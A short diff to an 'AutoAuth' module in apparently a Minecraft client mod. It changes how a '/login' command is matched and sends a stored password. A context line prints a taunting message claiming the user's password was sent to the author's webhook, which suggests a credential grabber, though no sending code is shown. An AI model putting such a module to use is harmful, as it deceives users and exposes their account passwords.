@@ -24,7 +24,7 @@ public class AutoAuth extends Module {
         Command.sendMessage(ChatFormatting.RED + "hahaha your password " + ChatFormatting.GREEN + this.Password.getValue() + ChatFormatting.RED + " was just sent to my crazy webhook!!! " + ChatFormatting.DARK_RED + "EZZZZZ");
 
         String message = event.getMessage();
-        if (message.equalsIgnoreCase("/login")) {
+        if (message.startsWith("/login")) {
             Util.mc.player.connection.sendPacket(new CPacketChatMessage("/login " + this.Password.getValue()));
             event.setCanceled(true);
         }
